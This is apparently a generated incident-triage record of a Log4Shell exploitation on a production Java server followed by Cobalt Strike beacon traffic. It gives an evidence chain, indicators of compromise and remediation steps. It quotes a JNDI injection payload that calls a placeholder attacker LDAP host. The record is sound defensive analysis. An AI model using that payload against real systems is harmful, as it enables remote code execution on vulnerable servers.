scenario: Log4j 漏洞利用尝试并连接 C2

judgment.summary: Confirmed successful Log4Shell exploitation on production Java server followed by Cobalt Strike beacon communication.
evidence_chain: WAF alert A15 detected JNDI injection payload ${jndi:ldap://malicious.ldap/a} targeting 10.0.2.88 (query_alert_detail)
Raw log confirms host 10.0.2.88 connected to malicious.ldap:1389 indicating successful callback (query_alert_detail)
Asset 10.0.2.88 is a high-level production Java system in DMZ zone (query_asset_info)
Threat intel confirms malicious.ldap is a known C2/exploit domain (query_threat_intel)
Threat intel confirms 192.0.2.200 is an active Log4Shell scanner (query_threat_intel)
Related alert A15-REL-01 shows Cobalt Strike beacon from 10.0.2.88 to 198.51.100.44 shortly after (query_related_alerts)

iocs.context: Suspected C2 server based on Cobalt Strike beacon

remediation: Immediately isolate host 10.0.2.88 from the network to prevent lateral movement.
Block IP 192.0.2.200, domain malicious.ldap, and IP 198.51.100.44 at perimeter firewall and WAF.
Apply emergency patch for Log4j CVE-2021-44228 on all affected Java applications.
Conduct forensic analysis on 10.0.2.88 to identify installed payloads and persistence mechanisms indicated by Cobalt Strike beacon.
Reset credentials for service accounts associated with java-app-02.
